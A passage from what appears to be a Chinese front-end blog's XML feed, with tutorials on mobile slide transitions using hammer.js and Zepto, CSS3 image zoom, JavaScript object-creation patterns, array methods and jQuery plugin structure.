$activePage.addClass('page--active');&#125;)();这样页面默认就显示了第一页。以向左滑屏说明这些css的使用原理：第一步，找到下一页的section，添加page–next类，将它定位当前页的右边，为滑屏做准备；第二步，找到当前页的section，给它添加page–active-left，由于这个类改变了translate3D属性的值，所以当前页会往左滑动一屏；在第二步的同时，给下一页的section，添加page–next-left，由于这个类改变了translate3D属性的值，所以下一页会往左滑动一屏；第三步，在当前页跟下一页滑屏动画结束后，找到原来的当前页，移除掉page–active和page–active-left类；在第三步的同时，找到下一页，移除掉page–next和page–next-left类，添加page–active。gif图说明如下：向右滑屏原理类似：第一步，找到上一页的section，添加page–prev类，将它定位当前页的左边，为滑屏做准备；第二步，找到当前页的section，给它添加page–active-right，由于这个类改变了translate3D属性的值，所以当前页会往右滑动一屏；在第二步的同时，给上一页的section，添加page–prev-right，由于这个类改变了translate3D属性的值，所以上一页会往右滑动一屏；第三步，在当前页跟上一页滑屏动画结束后，找到原来的当前页，移除掉page–active和page–active-right类；在第三步的同时，找到上一页，移除掉page–prev和page–prev-right类，添加page–active。综合以上实现原理，封装成JS函数如下：12345678910111213141516171819202122232425262728293031var TRANSITION_DURATION = 400, sliding = false; function getSlideType($targetPage) &#123; var activePageId = $activePage.attr('id'), targetPageId = $targetPage.attr('id'); return activePageId &lt; targetPageId ? 'next' : activePageId == targetPageId ? '' : 'prev';&#125;function slide(targetPageId) &#123; var $targetPage = $('#' + targetPageId); if (!$targetPage.length || sliding) return; var slideType = getSlideType($targetPage), direction = slideType == 'next' ? 'left' : 'right'; if (slideType == '') return; sliding = true; $targetPage.addClass('page--' + slideType); $targetPage[0].offsetWidth; $activePage.addClass('page--active-' + direction); $targetPage.addClass('page--' + slideType + '-' + direction); $activePage .one($.transitionEnd.end, function () &#123; $targetPage.removeClass(['page--' + slideType, 'page--' + slideType + '-' + direction].join(' ')).addClass('page--active'); $activePage.removeClass(['page--active', 'page--active-' + direction].join(' ')); $activePage = $targetPage; sliding = false; &#125;) .emulateTransitionEnd(TRANSITION_DURATION);&#125;&emsp;&emsp;由于$activePage在页面初始化的时候默认指定为第一页，在每次滑屏结束后都会更新成最新的当前页，所以调用的时候只要把目标页的ID传给slide函数即可。以上代码可能会有疑问的是：1）$targetPage[0].offsetWidth的作用，这个代码用来触发浏览器的重绘，因为目标页原来是display: none的，如果不触发重绘的话，下一步添加css类后将看不到动画效果；2）$.transitionEnd.end以及emulateTransitionEnd的作用，这个在下一部分说明。4. 浏览器css动画结束的回调及模拟&emsp;&emsp;bootstrap提供了一个工具，transition.js，用来判断浏览器是否支持css动画回调事件，以及在浏览器没有在动画结束后自动触发回调的特殊情况下通过模拟的方式来手动触发回调，原先这个工具只能配合jquery使用，为了在zepto中使用，必须稍微改变一下，下面就是改变之后的代码：1234567891011121314151617181920212223242526272829303132333435(function()&#123; var transition = $.transitionEnd = &#123; end: (function () &#123; var el = document.createElement('transitionEnd'), transEndEventNames = &#123; WebkitTransition: 'webkitTransitionEnd', MozTransition: 'transitionend', OTransition: 'oTransitionEnd otransitionend', transition: 'transitionend' &#125;; for (var name in transEndEventNames) &#123; if (el.style[name] !== undefined) &#123; return transEndEventNames[name]; &#125; &#125; return false; &#125;)() &#125;; $.fn.emulateTransitionEnd = function (duration) &#123; var called = false, _this = this, callback = function () &#123; if (!called) $(_this).trigger(transition.end); &#125;; $(this).one(transition.end, function () &#123; called = true; &#125;); setTimeout(callback, duration); return this; &#125;;&#125;)();&emsp;&emsp;$.transitionEnd.end表示当前浏览器支持的动画结束事件的名称。$.fn.emulateTransitionEnd是一个扩展了Zepto原型的一个方法，传入一个动画的过渡时间，当这个时间段过完之后，如果浏览器没有自动触发回调事件，called就始终是false，setTimeout会导致callback被调用，然后callback内部就会手动触发动画结束的回调。为什么要通过这个方式来模拟动画结束，是因为浏览器即使支持动画结束事件的回调，但是有些时候并不会触发这个事件，或者在动画结束后不能立即触发，影响回调的准确性。传入的duration应该与执行动画的元素，在css上设置的transtion-duration相同，注意以下代码中标黄的部分：123456789var TRANSITION_DURATION = 400;$activePage .one($.transitionEnd.end, function () &#123; $targetPage.removeClass(['page--' + slideType, 'page--' + slideType + '-' + direction].join(' ')).addClass('page--active'); $activePage.removeClass(['page--active', 'page--active-' + direction].join(' ')); $activePage = $targetPage; sliding = false; &#125;) .emulateTransitionEnd(TRANSITION_DURATION);12345678.page &#123; overflow: hidden; display: none; -webkit-transition: -webkit-transform .4s ease; transition: transform .4s ease; -webkit-backface-visibility: hidden; backface-visibility: hidden;&#125;5. hashchange事件&emsp;&emsp;PC端滑屏都是给元素添加点击事件触发的，移动端可以利用window的hashchange事件：1234567$(window).on('hashchange', function (e) &#123; var hash = location.hash; if (!hash) hash = '#page-1'; slide(hash.substring(1));&#125;);location.hash = '#page-1';&emsp;&emsp;hashchange事件，在js代码中通过改变loaction.hash或者是点击下一页这样的超链接时，都会触发，所以只要在这个事件的回调去做滑屏切换即可。这样那些上一页和下一页的链接元素都不用加事件了。6. hammer.js使用简介&emsp;&emsp;hammer.js是一个手势库，支持常用的手势操作，使用简单，引入它的js之后，通过以下的方式来支持手势滑屏：123456789101112131415161718//初始化手势滑动var container = document.getElementById('container'), mc = new Hammer.Manager(container), Swipe = new Hammer.Swipe();mc.add(Swipe);mc.on('swipeleft', function (e) &#123; swipteTo('next', e);&#125;);mc.on('swiperight', function (e) &#123; swipteTo('prev', e);&#125;);function swipteTo(slideType, e) &#123; var $targetPage = $activePage[slideType]('.page'); $targetPage.length &amp;amp;&amp;amp; (location.hash = '#' + $targetPage.attr('id'));&#125;&emsp;&emsp;把整个container元素作为滑屏的stage，监听到swipeleft事件，就表示向左滑，页面应该显示下一页；监听到swiperight事件，就表示向右滑，页面应该显示下一页。7. 结束语&emsp;&emsp;animate.css的使用就不详细介绍了，比较简单，这是它的github地址：https://github.com/daneden/animate.css，是一个非常好用的动画库。本文把最近的一点工作经验记录了下来，技术上的东西，有的时候一些文字不能完全讲的清楚，所以我只能尽自己的能力去把一些问题讲地稍微细致一点，说的不对和有问题的尽管在评论区与我说明，我会认真查看，另外我自己对移动端这一块入门不深，您有更好的见解，欢迎与我们一起分享。]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>hammer.js</tag>
        <tag>hammer.js实现简洁的滑屏功能</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS3移入图片放大效果]]></title>
    <url>%2F2015%2F08%2F08%2Fcss3%E7%A7%BB%E5%85%A5%E5%9B%BE%E7%89%87%E6%94%BE%E5%A4%A7%E6%95%88%E6%9E%9C%2F</url>
    <content type="text"><![CDATA[我们有时看到一些网站有的照片，当我们将鼠标移入的时候，会有个放大的动画效果，今天我就来讲讲这个效果是如何实现的。HTML的基本结构我们需要一个 pic 来作为 3D 场景，里面有一个 img 标签作为图片的容器。123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;title&gt;放大镜效果&lt;/title&gt;&lt;style&gt;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="pic"&gt;&lt;img src="img/pic.jpg"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;#pic 的基本 CSS设定高、宽、居中效果、背景颜色（实际上图片会覆盖掉），同时超出部分hidden。1234567#pic&#123;height:480px;width:480px;margin:0 auto;background-color: #ccc;overflow: hidden;&#125;设置 img 的初始样式由于要保证放大后的清晰度，所以往往做这个效果的照片在鼠标未移入前会缩小显示，而hover后才恢复正常比例。我使用的照片是 960px × 960px 的，初始时设置照片缩小到原来的 0.5 倍（这也是为什么上面的#pic我设置高和宽都为480px）。图片默认是中心放大/缩小的，所以初始化时我们缩小到 0.5 倍时图片四周会有一定的“空隙”，我们可以使用 margin 的方法来解决这个问题。1234#pic img&#123;margin:-240px 0 0 -240px;-webkit-transform: scale(.5); /* 默认显示 0.5 倍的照片 */&#125;为了有渐渐放大的动画效果，可以使用 transition 属性：1s;```123456**设置 img 的移入效果**通过 :hover 这个伪类来改变 transform 属性以实现放大效果。```css#pic img:hover&#123;-webkit-transform: scale(.6);&#125;所有代码12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;title&gt;放大镜效果&lt;/title&gt;&lt;style&gt;#pic&#123;height:480px;width:480px;margin:0 auto;background-color: #ccc;overflow: hidden;&#125;#pic img&#123;margin:-240px 0 0 -240px;-webkit-transform: scale(.5);-webkit-transition: 1s;&#125;#pic img:hover&#123;-webkit-transform: scale(.6);&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="pic"&gt;&lt;img src="img/pic.jpg"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;Ps : demo 以 Webkit 为例，其它浏览器内核请自行加上如 -moz- 等前缀。查看演示]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>CSS3移入图片放大</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[判断是否是微信打开页面代码]]></title>
    <url>%2F2015%2F08%2F08%2F%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%98%AF%E5%BE%AE%E4%BF%A1%E6%89%93%E5%BC%80%E9%A1%B5%E9%9D%A2%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[12345678function is_weixn()&#123;var ua = navigator.userAgent.toLowerCase();if(ua.match(/MicroMessenger/i)=="micromessenger") &#123;return true;&#125; else &#123;return false;&#125;&#125;]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>判断是否是微信打开</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网页某块区域鼠标不让选中文字]]></title>
    <url>%2F2015%2F08%2F08%2F%E7%BD%91%E9%A1%B5%E6%9F%90%E5%9D%97%E5%8C%BA%E5%9F%9F%E9%BC%A0%E6%A0%87%E4%B8%8D%E8%AE%A9%E9%80%89%E4%B8%AD%E6%96%87%E5%AD%97%2F</url>
    <content type="text"><![CDATA[1、给元素加样式1-webkit-user-select:none; -moz-user-select:none; -ms-user-select:none; user-select:none;2、ie6-ie9 需要加以下jsa. //不可选中文字12345var oDrag = document.getElementsByClassName("ard-adv");for(var i=0; i&lt;oDrag.length; i++)&#123;oDrag[i].onselectstart = oDrag[i].ondrag = function()&#123;return false;&#125;;&#125;b. //整个网页12345document.body.onselectstart = document.body.ondrag = function()&#123;return false;&#125;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>某块区域不让选中文字</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[创建javascript对象的方法]]></title>
    <url>%2F2015%2F08%2F06%2F%E5%88%9B%E5%BB%BAjavascript%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[一、工厂模式12345678910111213function person (name,age) &#123; var p=new Object(); p.name=name; p.age=age; p.showMessage=function()&#123; console.log("name:"+this.name+" age:"+this.age); &#125; return p;&#125;var p1=person("k1",28);var p2=person("k2",29);console.log(p1.showMessage==p2.showMessage);//false 不是同一个showMessage方法console.log(p1.constructor);//[object] 都是object&emsp;工厂模式的缺陷是：没解决对象识别的问题，而且每个对象的showMessage方法都不是同一个方法（每个方法在每个对象实例上都重新创建了一遍），增加了开销&nbsp;二、构造函数模式123456789101112function Person (name,age) &#123; this.name=name; this.age=age; this.showMessage=function()&#123; console.log("name:"+this.name+" age:"+this.age); &#125;&#125;var p1=new Person("k1",28);var p2=new Person("k2",29);console.log(p1.showMessage==p2.showMessage);//false 不是同一个showMessage方法console.log(p1.constructor);//[Person]console.log(p1 instanceof Person);// true&emsp;&emsp;构造函数模式解决了对象识别的问题，但是每个对象的showMessage方法不是同一个方法（每个方法在每个对象实例上都重新创建了一遍），增加了开销三、原型模式1234567891011121314151617181920function Person () &#123;&#125;Person.prototype.name ="k";Person.prototype.age =29;Person.prototype.showMessage=function () &#123; console.log("name:"+this.name+" age:"+this.age);&#125;;var p1=new Person();p1.showMessage();//name:k age:29var p2=new Person();p2.showMessage();//name:k age:29console.log(p1.showMessage==p2.showMessage);// true --引用的是同一函数console.log(p1.constructor)//[Person] --对象识别console.log(p1 instanceof Person)//true --对象识别console.log(Person.prototype.isPrototypeOf(p1));// trueconsole.log(Object.getPrototypeOf(p1)==Person.prototype);// true&emsp;&emsp;原型模式解决了“每个方法在每个对象实例上都重新创建了一遍”的问题，也解决了对象识别的问题原型模式有个很大的问题是，因为挂载在函数prototype下面的所有对象、变量、函数都是被该函数的所有实例共享的，虽然通过实例p1、p2可以访问到prototype的属性，但是却不能修改属性值，例如p1.name=”k1”，只是在p1实例上添加了一个name=”k1”的属性，并没改到prototype.name。如果是值类型还好，如果是引用类型的话，就会有问题了，看如下的例子123456789101112function Person () &#123; &#125;;Person.prototype.age =10;Person.prototype.array=[1,2,3];var p1=new Person();var p2=new Person();console.log(p1.array);// [1,2,3]console.log(p2.array); //[1,2,3]p1.array.push(4);console.log(p1.array);//[1,2,3,4]console.log(p2.array);//[1,2,3,4]p1往array里面添加了值，在p2也反映出来了，因为他们都是指向同一个array&nbsp;四、组合使用构造函数模式和原型模式这是最常见的创建对象的方式，结合了构造函数和原型模式的优点1234567891011function Person (name,age) &#123; this.name=name; this.age=age;&#125;Person.prototype.showMessage = function() &#123; console.log("name:"+this.name+" age:"+this.age);&#125;;var p1=new Person("k",30);p1.showMessage();五、动态原型模式主要是解决：把所有的信息都封装在构造函数中，更符合oo的思想123456789101112function Person (name,age) &#123; this.name=name; this.age=age; if(typeof this.showMessage!="function")&#123; Person.prototype.showMessage=function()&#123; console.log("name:"+this.name+" age:"+this.age); &#125; &#125;&#125;var p1=new Person("k",30);p1.showMessage();六、寄生构造函数模式1234567891011function Person (name,age) &#123; var o=new Object(); o.name=name; o.age=age; o.sayName=function()&#123; console.log(this.name); &#125;; return o;&#125;var p1=new Person("k",28);p1.sayName();&emsp;&emsp;寄生构造函数模式和工厂模式是一模一样的，只不过创建对象的时候使用了new 关键字，上例：var p1=new Person(“k”,28)。它的主要作用是：在这个构造函数里面进行功能的扩展，例如，我想定义一个数组类型MyArray，它是以Array数组为基础的，有一个自己的方法，如下123456789101112function MyArray()&#123; var values=new Array(); values.push.apply(values,arguments); //自己定义的方法 values.toPipedString=function()&#123; return this.join('|'); &#125;; return values;&#125;var colors=new MyArray("red","blue","green");console.log(colors.toPipedString());console.log(colors instanceof Array);七、稳妥构造函数模式&emsp;&emsp;稳妥构造函数遵循与寄生构造函数类型的模式，但有两点不同：一是不使用this，二是不使用new 调用构造函数123456789101112131415161718192021222324function Person (name,age) &#123; var o=new Object(); var tempAge=age; o.name=name; o.age=age; o.sayName=function()&#123; console.log(name); &#125; o.sayAge=function()&#123; console.log(tempAge); &#125; return o;&#125;var p1=Person("k1",28);p1.sayName(); // k1p1.sayAge(); // 28p1.name="k2";p1.age=30;p1.sayName(); // k1p1.sayAge(); //28&emsp;&emsp;看到如上的输出就很好理解什么叫稳妥对象模式了，就是用这种模式创建的对象，没有其他办法能够改变初始化时候传入的值，这里是Person(“k1”,28)，这样的对象就是稳妥对象，实际上这里使用到就是javascript的闭包了。&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>创建js对象</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js数组操作大全]]></title>
    <url>%2F2015%2F08%2F06%2Fjs%E6%95%B0%E7%BB%84%E6%93%8D%E4%BD%9C%E5%A4%A7%E5%85%A8%2F</url>
    <content type="text"><![CDATA[shift：删除原数组第一项，并返回删除元素的值；如果数组为空则返回undefinedvar a = [1,2,3,4,5];var b = a.shift(); //a：[2,3,4,5] b：1&nbsp;unshift：将参数添加到原数组开头，并返回数组的长度var a = [1,2,3,4,5];var b = a.unshift(-2,-1);//a：[-2,-1,1,2,3,4,5] b：7注：在IE6.0下测试返回值总为undefined，FF2.0下测试返回值为7，所以这个方法的返回值不可靠，需要用返回值时可用splice代替本方法来使用。&nbsp;pop：删除原数组最后一项，并返回删除元素的值；如果数组为空则返回undefinedvar a = [1,2,3,4,5];var b = a.pop(); //a：[1,2,3,4] b：5&nbsp;push：将参数添加到原数组末尾，并返回数组的长度var a = [1,2,3,4,5];var b = a.push(6,7); //a：[1,2,3,4,5,6,7] b：7&nbsp;concat：返回一个新数组，是将参数添加到原数组中构成的var a = [1,2,3,4,5];var b = a.concat(6,7);//a：[1,2,3,4,5]b：[1,2,3,4,5,6,7]&nbsp;splice(start,deleteCount,val1,val2,…)：从start位置开始删除deleteCount项，并从该位置起插入val1,val2,…var a = [1,2,3,4,5];var b = a.splice(2,2,7,8,9);//a：[1,2,7,8,9,5] b：[3,4]var b = a.splice(0,1); //同shifta.splice(0,0,-2,-1);var b = a.length; //同unshiftvar b = a.splice(a.length-1,1); //同popa.splice(a.length,0,6,7);var b = a.length; //同push&nbsp;reverse：将数组反序var a = [1,2,3,4,5];var b = a.reverse(); //a：[5,4,3,2,1] b：[5,4,3,2,1]&nbsp;sort(orderfunction)：按指定的参数对数组进行排序var a = [1,2,3,4,5];var b = a.sort(); //a：[1,2,3,4,5] b：[1,2,3,4,5]&nbsp;slice(start,end)：返回从原数组中指定开始下标到结束下标之间的项组成的新数组var a = [1,2,3,4,5];var b = a.slice(2,5);//a：[1,2,3,4,5]b：[3,4,5]&nbsp;join(separator)：将数组的元素组起一个字符串，以separator为分隔符，省略的话则用默认用逗号为分隔符var a = [1,2,3,4,5];var b = a.join(“|”);//a：[1,2,3,4,5] b：”1|2|3|4|5”&nbsp;数组是JavaScript提供的一个内部对象，它是一个标准的集合，我们可以添加(push)、删除(shift)里面元素，我们还可以通过for循环遍历里面的元素，那么除了数组我们在JavaScript里还可以有别的集合吗?由于JavaScript的语言特性，我们可以向通用对象动态添加和删除属性。所以Object也可以看成是JS的一种特殊的集合。下面比较一下Array和Object的特性:Array:新建:var ary = new Array(); 或 var ary = [];增加:ary.push(value);删除:delete ary[n];遍历:for ( var i=0 ; i &lt; ary.length ; ++i ) ary[i];Object:新建:var obj = new Object(); 或 var obj = {};增加:obj[key] = value; (key为string)删除:delete obj[key];遍历:for ( var key in obj ) obj[key];从上面的比较可以看出Object完全可以作为一个集合来使用。如果我们要在Array中检索出一个指定的值，我们需要遍历整个数组:代码：12345678var keyword = ;for ( var i=0 ; i &lt; ary.length ; ++i )&#123;if ( ary[i] == keyword )&#123;// todo&#125;&#125;&nbsp;而我们在Object中检索一个指定的key的条目，只需要是要使用:代码：123var key = '';var value = obj[key];// todo&nbsp;Object的这个特性可以用来高效的检索Unique的字符串集合，遍历Array的时间复杂度是O(n)，而遍历Object的时间复杂度是O(1)。虽然对于10000次集合的for检索代价也就几十ms，可是如果是1000*1000次检索或更多，使用Object的优势一下就体现出来了。在此之前我做了一个mapping，把100个Unique的字符mapping到1000个字符串数组上，耗时25-30s!后来把for遍历改成了Object模拟的集合的成员引用，同样的数据量mapping，耗时仅1.7-2s!!!对于集合的遍历效率(从高到低):1var value = obj[key]; &gt; for ( ; ; ) &gt; for ( in )效率最差的就是for( in )了，如果集合过大，尽量不要使用for ( in )遍历。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js数组操作</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery图片预加载插件 neatshowjs]]></title>
    <url>%2F2015%2F08%2F06%2Fjquery%E5%9B%BE%E7%89%87%E9%A2%84%E5%8A%A0%E8%BD%BD%E6%8F%92%E4%BB%B6-neatshowjs%2F</url>
    <content type="text"><![CDATA[neatShow.js是一个全新的能够控制图片加载方式的jquery插件，它能够让图片在加载过程中预先阻止它们的显示，直到加载完毕后将它们以一种非常平滑的渐变方式显示出来，采用这种方式加载图片可以在一定程度上提升网站的阅览体验，比如淘宝ued图片的加载方式就与此类似。neatShow.js的使用方法也很简单，首先加载相应的neatshowjs脚本以及jquery库默认情况下的用法$(selector).neatShow()将selector替换为对应的图片标签即可12345678这种方法是对网站所有img标签起作用，如果你只想让一部分图片采用这种加载效果，例如只对类名为container内的img标签起作用可以这么写。$(.container img).neatShow();最后你还可以调整图片加载参数```javascript$(&apos;img&apos;).neatShow(&#123;speed: &apos;random&apos;, minSpeed: 400, maxSpeed: 4000&#125;);&nbsp;neatShow.js官方地址查看演示点击下载&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jq图片预加载</tag>
        <tag>neatshowjs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css3产品展示幻灯片]]></title>
    <url>%2F2015%2F08%2F06%2Fcss3%E4%BA%A7%E5%93%81%E5%B1%95%E7%A4%BA%E5%B9%BB%E7%81%AF%E7%89%87%2F</url>
    <content type="text"><![CDATA[今天介绍的css3产品展示幻灯片不同于以往的幻灯片，它采用了字体和图片翻转的技术进行产品的切换，这种动感的切换方式可以在一定程度上获取用户的注意，该特效使用了impress.js和css3相结合，impress.js是一个独立的脚本库能够让css3在动态效果的使用方面获得更好的表现力。&nbsp;查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>css3产品展示</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[鼠标经过方向感知特效]]></title>
    <url>%2F2015%2F08%2F06%2F%E9%BC%A0%E6%A0%87%E7%BB%8F%E8%BF%87%E6%96%B9%E5%90%91%E6%84%9F%E7%9F%A5%E7%89%B9%E6%95%88%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;目前很多优秀的网站都会在图片展示细节上下功夫，比如图片的显示方式，鼠标经过图片会出现种种不同种类的效果，只要稍微对图片做一点修饰，网站的体验便会得到相应的提升。今天向大家分享一个鼠标经过方向感知特效，当鼠标经过图片时就会被一层阴影覆盖，并且图片的阴影覆盖会随着你的鼠标的进入方向而定。查看演示点击下载&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>鼠标经过方向感知</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网页产品元素快速查看特效]]></title>
    <url>%2F2015%2F08%2F06%2F%E7%BD%91%E9%A1%B5%E4%BA%A7%E5%93%81%E5%85%83%E7%B4%A0%E5%BF%AB%E9%80%9F%E6%9F%A5%E7%9C%8B%E7%89%B9%E6%95%88%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;分享一款动态十足的网页产品元素快速查看特效，该特效基于CSS3 和 Velocity.js开发，它为用户提供了一种快速查看产品详细信息的方式，当你点击产品元素时，该产品元素的详细信息会以弹窗的方式显示给用户，弹窗中还可以加入该产品的多图切换效果。&nbsp;查看演示点击下载&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>产品元素展示特效</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[响应式全屏无缝切换幻灯片DivasSlider]]></title>
    <url>%2F2015%2F08%2F06%2F%E5%93%8D%E5%BA%94%E5%BC%8F%E5%85%A8%E5%B1%8F%E6%97%A0%E7%BC%9D%E5%88%87%E6%8D%A2%E5%B9%BB%E7%81%AF%E7%89%87divasslider%2F</url>
    <content type="text"><![CDATA[插件描述：Divas&emsp;&emsp;Slider是一个多才多艺的jQuery滑块,容易使用和完全可定制。 充分响应和触摸启用。1.引入样式表123&lt;link rel="stylesheet" type="text/css" media="screen" href="css/CSSreset.min.css" /&gt;&lt;link rel="stylesheet" type="text/css" media="screen" href="css/divas_instructions_style.css" /&gt;&lt;link id="skin" rel="stylesheet" type="text/css" media="screen" href="css/divas_free_skin.css" /&gt;2.引入js1234567891011121314&lt;script type="text/javascript" src="js/jquery.divas-1.0.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt; $(document).ready(function() &#123; $("#slider").divas(&#123; slideTransitionClass: "divas-slide-transition-left", titleTransitionClass: "divas-title-transition-left", titleTransitionParameter: "left", titleTransitionStartValue: "-999px", titleTransitionStopValue: "0px", wingsOverlayColor: "rgba(0,0,0,0.6)" //设置两侧遮罩层透明度 &#125;); &#125;);&lt;/script&gt;3.html部分123456789101112131415161718192021&lt;section id="slider_wrapper"&gt; &lt;div id="slider" class="divas-slider"&gt; &lt;ul class="divas-slide-container"&gt; &lt;li class="divas-slide"&gt;&lt;img src="images/placeholder.gif" alt="" data-src="images/slider/img1.jpg" data-title="&lt;h1&gt;Divas Slider&lt;/h1&gt;&lt;p&gt;Title is visible only if you use the attribute 'data-title' of your image&lt;/p&gt;"/&gt;&lt;/li&gt; &lt;li class="divas-slide"&gt;&lt;img src="images/placeholder.gif" alt="" data-src="images/slider/img2.jpg" data-title="&lt;h1&gt;Divas Slider&lt;/h1&gt;&lt;p&gt;Gives you the full freedom of clickable images&lt;/p&gt;" /&gt;&lt;/li&gt; &lt;li class="divas-slide"&gt;&lt;img src="images/placeholder.gif" alt="" data-src="images/slider/img4.jpg" data-title="&lt;h1&gt;Divas Slider&lt;/h1&gt;&lt;p&gt;Images use lazy loading via deferred object&lt;/p&gt;"/&gt;&lt;/li&gt; &lt;li class="divas-slide"&gt;&lt;img src="images/placeholder.gif" alt="" data-src="images/slider/img3.jpg" data-title="&lt;h1&gt;Divas Slider&lt;/h1&gt;&lt;p&gt;You can style it as you wish via CSS&lt;/p&gt;"/&gt;&lt;/li&gt; &lt;li class="divas-slide"&gt;&lt;img src="images/placeholder.gif" alt="" data-src="images/slider/img5.jpg" data-title="&lt;h1&gt;Divas Slider&lt;/h1&gt;&lt;p&gt;Uses CSS3 transitions or jQuery.animate() as a fallback&lt;/p&gt;" /&gt;&lt;/li&gt; &lt;li class="divas-slide"&gt;&lt;img src="images/placeholder.gif" alt="" data-src="images/slider/img6.jpg" data-title="&lt;h1&gt;Divas Slider&lt;/h1&gt;&lt;p&gt;You can set up almost any slider style your desire&lt;/p&gt;" /&gt;&lt;/li&gt; &lt;li class="divas-slide"&gt;&lt;img src="images/placeholder.gif" alt="" data-src="images/slider/img7.jpg" data-title="&lt;h1&gt;Divas Slider&lt;/h1&gt;&lt;p&gt;Gives you extensive documentation and friendly support&lt;/p&gt;" /&gt;&lt;/li&gt; &lt;/ul&gt; &lt;div class="divas-navigation"&gt; &lt;span class="divas-prev"&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class="divas-next"&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;/div&gt; &lt;div class="divas-controls"&gt; &lt;span class="divas-start"&gt;&lt;i class="fa fa-play"&gt;&lt;/i&gt;&lt;/span&gt; &lt;span class="divas-stop"&gt;&lt;i class="fa fa-pause"&gt;&lt;/i&gt;&lt;/span&gt; &lt;/div&gt; &lt;/div&gt;&lt;/section&gt;查看演示点击下载&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>DivasSlider</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[教你创建更好的jQuery插件]]></title>
    <url>%2F2015%2F08%2F05%2F%E6%95%99%E4%BD%A0%E5%88%9B%E5%BB%BA%E6%9B%B4%E5%A5%BD%E7%9A%84jquery%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在开发过很多 jQuery 插件以后，我慢慢的摸索出了一套开发jQuery插件比较标准的结构和模式。这样我就可以 copy &amp; paste 大部分的代码结构，只要专注最主要的逻辑代码就行了。使用相同的设计模式和架构也让修复bug或者二次开发更容易。一套经过验证的架构可以保证我的插件不出大的问题，不论插件简单还是复杂。我在这里分享10条我总结的经验。&nbsp;1. 把你的代码全部放在闭包里面这是我用的最多的一条。但是有时候在闭包外面的方法会不能调用。不过你的插件的代码只为你自己的插件服务，所以不存在这个问题，你可以把所有的代码都放在闭包里面。而方法可能应该放在Prototype方法内部。123(function($) &#123; //code here &#125;)(jQuery);&nbsp;2. 提供插件的默认选项你的插件应该会有一些选项是可以让开发者设置的，所以提供恢复默认选项是以有必要的。 你可以通过jQuery的extend功能来设置这些选项：12345var defaultSettings = &#123; mode : 'Pencil', lineWidthMin : '0', lineWidthMax : '10', lineWidth : '2' &#125;; settings = $.extend(&#123;&#125;, defaultSettings, settings || &#123;&#125;);&nbsp;3. 使用返回一个元素JavaScript/jQuery有一个很好的特点就是可以进行方法级联，所以我们不应该破坏这个特性，始终在方法中返回一个元素。我在我的每一个jQuery插件中都遵守这一条。= function(settings) &#123;12345 return this.each(function() &#123; var elem = $(this); //run some code here &#125; &#125;&nbsp;4. 一次性代码放在主循环以外这一条很重要，但是常常被忽略。简单的讲，如果你有一段代码是一堆默认值，只需要被实例化一次，而不是每次调用你插件功能的时候都实例化，你应该把这段代码放在插件方法的外面。这样可以让你的插件运行的更高效，节省内存。12345678910111213var defaultSettings = &#123; mode : 'Pencil', lineWidthMin : '0', lineWidthMax : '10', lineWidth : '2' &#125;; settings = $.extend(&#123;&#125;, defaultSettings, settings || &#123;&#125;);$.fn.wPaint = function(settings) &#123; return this.each(function() &#123; var elem = $(this); //run some code here &#125; &#125;&emsp;&emsp;你可以注意到，上面代码中的“defaultSettings”是完全在插件方法外面的，由于这些代码是在闭包里面，我们不用担心这些变量被重写。5. 为什么要设置 Class Prototyping作为你代码的血与肉，方法和函数应该放在prototype函数内。有两个原因：◆ 它可以节省很多内存，因为可以不用重复创建这些方法。◆ 引用一个现成的方法比重新创建一个好快很多。简单的说，prototype就是扩展了一个对象，为它提供方法，而不用在每一个对象中实例化这些方法。这也让你的代码更有条理和高效。一旦你习惯这种开发方式，你会发现它在你将来的项目中为你节省了很多时间。&nbsp;6. 如何设置 Class Prototyping设置一个 prototype 方法有两个部分。首先我们需要创建我们最初的类定义，在多数情况下这就意味着创建一个对象。这个定义包含了每一个对象实例都不同的部分。在我的Paint jQuery Plugin 插件中，我是这么写的：123456function 